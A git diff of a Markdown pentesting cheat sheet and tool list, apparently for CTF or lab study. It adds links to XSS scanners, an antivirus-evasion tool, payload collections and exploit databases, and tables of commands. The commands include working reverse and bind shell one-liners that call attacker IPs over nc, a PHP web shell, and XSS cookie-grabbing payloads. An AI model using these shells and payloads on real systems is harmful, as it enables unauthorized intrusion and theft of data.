@@ -15,10 +15,10 @@
 
 ### Passive subdomains enumeration
  - [VirusTotal](https://www.virustotal.com/gui/home/upload) - Analyze suspicious files, domains, IPs and URLs to detect malware and other breaches
- - [Censys](https://censys.io/) - Censys continually scans the public IPv4 address space on 3,552+ ports using automatic protocol detection to present the most accurate representation of the Internet's current state.
+ - [Censys](https://censys.io/) - Censys continually scans the public IPv4 address space on 3,552+
  - [Crt.sh](https://crt.sh/) - Certificate search tool
  - [Sublist3r](https://github.com/aboul3la/Sublist3r) - Fast subdomains enumeration tool for penetration testers
-
+ 
 
 ## Active subdomains enumeration
  - [HackerTarget](https://hackertarget.com/zone-transfer/) - From attack surface discovery to vulnerability identification, actionable network intelligence for IT & security operations.
@@ -33,13 +33,19 @@
 ### Active infrastructure identification
  - [Whatweb](https://github.com/urbanadventurer/WhatWeb) - Next generation web scanner
  - [Aquatone](https://github.com/michenriksen/aquatone) - A Tool for Domain Flyovers
- - [Wafw00f](https://github.com/EnableSecurity/wafw00f) - WAFW00F allows one to identify and fingerprint Web Application Firewall products protecting a website.
+ - [Wafw00f](https://github.com/EnableSecurity/wafw00f) - Identify and fingerprint Web Application Firewall products protecting a website.
  - [Wappalyzer](https://www.wappalyzer.com/) - Technology profiler, find out what websites are built with
 
 ### Web server scanner / Vulnerability scanner
  - [OpenVAS](https://www.openvas.org/) - Powerful open source vulnerability scanner
  - [Nikto](https://github.com/sullo/nikto) - Web server scanner
  - [WPscan](https://github.com/wpscanteam/wpscan) - WPScan WordPress security scanner
+ - [Cmsmap](https://github.com/Dionach/CMSmap) - CMSmap is a python open source CMS scanner that automates the process of detecting security flaws of the most popular CMSs.
+
+### XSS scanner
+ - [XSStrike](https://github.com/s0md3v/XSStrike) - Most advanced XSS scanner
+ - [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) - BruteXSS is a tool written in python simply to find XSS vulnerabilities
+ - [Xsser](https://github.com/epsylon/xsser) - Cross Site "Scripter" (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications
 
 ### Web Fuzzer
  - [Ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go
@@ -62,16 +68,45 @@
  - [Seclist](https://github.com/danielmiessler/SecLists) - Collection of multiple types of lists used during security assessments, collected in one place
  - [Hob0Rules](https://github.com/praetorian-inc/Hob0Rules) - Password cracking rules for Hashcat based on statistics and industry patterns
 
+### Obfuscation
+ - [obfuscation_detection](https://github.com/mrphrazer/obfuscation_detection.git) - Collection of scripts to pinpoint obfuscated code
+ - [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator.git) - A powerful obfuscator for JavaScript and Node.js
+ - [Phantom-Evasion](https://github.com/oddcod3/Phantom-Evasion.git) - Python antivirus evasion tool
+ - [Jsconsole](https://jsconsole.com/) - Js deobfuscation website
+ - [Pretier](https://prettier.io/playground/) - An opinionated code formatter
+ - [Beautifier](https://beautifier.io/) - Improves the presentation of programming source code
+ - [Jsnice](http://www.jsnice.org/) - Make even obfuscated JavaScript code readable
+
+### Payloads lists
+ - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - A list of useful payloads and bypass for Web Application Security and Pentest/CTF
+ - [Xss payloads list](https://github.com/payloadbox/xss-payload-list) - Cross Site Scripting ( XSS ) Vulnerability Payload List
+
+### Exploits Databases
+ - [Exploit-db](https://www.exploit-db.com/) - The Exploit Database - Exploits, Shellcode, 0days, Remote Exploits, Local Exploits, Web Apps, Vulnerability Reports, Security Articles, Tutorials and more.
+ - [PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub) - PoC auto collect from github 
+
 ### Formating
- -[Html2text](https://github.com/aaronsw/html2text) - Convert HTML to Markdown-formatted text
+ - [Html2text](https://github.com/aaronsw/html2text) - Convert HTML to Markdown-formatted text
+
+### Encode / Decode
+ - [Cipher identifier](https://www.boxentriq.com/code-breaking/cipher-identifier) - Identify the type of cipher
+ - [Dcode](https://www.dcode.fr/en) - Decoding messages
+ - [Online barecode reader](https://online-barcode-reader.inliteresearch.com/) - Free online barecode reader
+
+### Forensic
+ - [Usbrip](https://github.com/snovvcrash/usbrip) - Tracking history of USB events on GNU/Linux  
+
+### Steganography
+ - [LSB-steganography](https://github.com/RobinDavid/LSB-Steganography.git) - Python program to steganography files into images using the Least Significant Bit
+ - [Stego-kit](https://github.com/DominicBreuker/stego-toolkit) - Collection of steganography tools - helps with CTF challenges
+ - [Jset](https://github.com/lukechampine/jsteg) - JPEG steganography
+ - [Zsteg](https://github.com/zed-0xff/zsteg) - Detect stegano-hidden data in PNG & BMP
+ - [Sstv](https://github.com/colaclanth/sstv) - SSTV Decoder
+ - [Slowrx](https://github.com/windytan/slowrx) - A decoder for Slow-Scanning Television (SSTV)
+ - [Robot36](https://github.com/xdsopl/robot36.git) - Encode and decode images using SSTV in Robot 36 mode
+
 
 ## Sheetcheat
-
-### WHOIS
-| Description        | Command      |
-| ------ | ----- |
-| Assign target to an environment variable | ``export TARGET="domain.tld" ``|
-| WHOIS lookup for the target | `` whois $TARGET ``|
 
 ### Service Scanning
 | Description        | Command      |
@@ -148,6 +183,18 @@
 | List details about the webserver/certificates | `` whatweb 10.10.10.121 `` |
 | List potential directories in robots.txt | `` curl 10.10.10.121/robots.txt `` |
 
+### Encode / Decode
+| Description        | Command      |
+| ------ | ----- |
+| List potential directories in robots.txt | `` curl 10.10.10.121/robots.txt `` |
+| List potential directories in robots.txt | `` curl 10.10.10.121/robots.txt `` |
+| Base64 encode | `` echo value \| base64 `` |
+| Base64 decode | `` echo ENCODED_B64 \| base64 -d	`` |
+| Hex encode | `` echo VALUE \| xxd -p	 `` |
+| Hex decode | `` echo ENCODED_HEX \| xxd -p -r `` |
+| Rot13 encode | `` echo VALUE | tr 'A-Za-z' 'N-ZA-Mn-za-m' `` |
+| Rot13 decode | `` echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'	`` |
+
 ### Fuzzing
 | Description        | Command      |
 | ------ | ----- |
@@ -156,7 +203,7 @@
 | Page Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-content/directory.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php `` |
 | Recursive Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v `` |
 | Subdomain Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-content/subdomains.txt:FUZZ -u https://FUZZ.example.com `` |
-| VHost Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx `` |
+| VHost Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com' -fs xxx `` |
 | Get parameter Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-convent/burp-parameters.txt:FUZZ -u http://example.com:PORT/admin/admin.php?FUZZ=key -fs xxx `` |
 | Post parameter Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-convent/burp-parameters.txt:FUZZ -u http://example.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx `` |
 | Value Fuzzing with ffuf | ``ffuf -w ids.txt:FUZZ -u http://example.com:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx `` |
@@ -191,10 +238,9 @@
 | Another command to send a reverse shell from the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f `` |
 | Start a bind shell (bash) | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f `` |
 | Start a bind shell (python) | `` python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")' `` |
-| Start a bind shell (powershell) | `` powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); `` |
+| Start a bind shell (powershell) | `` powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); `` |
 | Start a reverse shell from php | `` <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.2 4444 >/tmp/f"); ?> `` |
-| Add a reverse shell in php page | `` system($_GET['cmd']) ``; |
-| Open 
+| Add a reverse shell in php code | `` system($_GET['cmd']) ``; |
 | Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234	 `` |
 | Python: Upgrade shell TTY | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
 | Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
@@ -229,7 +275,7 @@
 | Download a file on the remote server from our local machine | `` wget http://10.10.14.1:8000/linpeas.sh	`` |
 | Download a file on the remote server from our local machine | `` curl http://10.10.14.1:8000/linenum.sh -o linenum.sh	`` |
 | Transfer a file to the remote server with scp (requires SSH access) | `` scp linenum.sh user@remotehost:/tmp/linenum.sh	`` |
-| Convert a file to base64 | `` base64 shell -w 0	`` |
+| Convert a file to base64 | `` base64 shell -w 0 `` |
 | Convert a file from base64 back to its orig | ``echo f0VMR...SNIO...InmDwU \| base64 -d > shell `` |
 | Check the file's md5sum to ensure it converted correctly | `` md5sum shell `` |
 
@@ -256,6 +302,10 @@
 ### XSS attacks
 | Description        | Command      |
 | ------ | ----- |
+| Basic XSS Payload to test target | `` <script>alert(window.origin)</script> `` |
+| Basic XSS Payload to test target | `` <plaintext> `` |
+| Basic XSS Payload to test target | `` <script>print()</script> `` |
+| HTML-based XSS Payload | `` <img src="" onerror=alert(window.origin)>	`` |
 | Get the cookie value | `` #"><img src=/ onerror=alert(document.cookie)> `` |
 
 ### Wordpress hacking
@@ -265,8 +315,8 @@
 | Plugins enumeration | `` curl -s -X GET http://example.com \| sed 's/href=/\n/g' \| sed 's/src=/\n/g' \| grep 'wp-content/plugins/*' \| cut -d"'" -f2 `` |
 | Themes enumeration | `` curl -s -X GET http://example.com \| sed 's/href=/\n/g' \| sed 's/src=/\n/g' \| grep 'themes' \| cut -d"'" -f2 `` |
 | Check response header for file or directory | `` curl -I -X GET http://example.com/wp-content/plugins/form-contact/ \| html2text `` |
-| Check the user list with JSON | `` curl http://example.com/wp-json/wp/v2/users \| jq ``|
-| XML-RPC: Check if XML-RPC server accecpts requests | `` curl http://example.co    m/xmlrpc.php ``|
+| Check the user list with JSON endpoint | `` curl http://example.com/wp-json/wp/v2/users \| jq ``|
+| XML-RPC: Check if XML-RPC server accecpts requests | `` curl http://example.com/xmlrpc.php ``|
 | XML-RPC: Check if a user exists with POST | `` curl -s -I -X GET http://example.com/?author=1 `` |
 | XML-RPC: List all methods enabled| `` curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>user</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php \| grep "<value><string>"`` |
 | XML-RPC: Connect with credentials | `` curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>user</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://example.com/xmlrpc.php `` |
@@ -277,6 +327,7 @@
 | Description        | Command      |
 | ------ | ----- |
 | Add DNS entry | `` sudo sh -c 'echo "SERVER_IP example.com" >> /etc/hosts' `` |
+| Start python http server | `` python3 -m http.server 8000 `` |
 
 
 ## Pentesting iteration
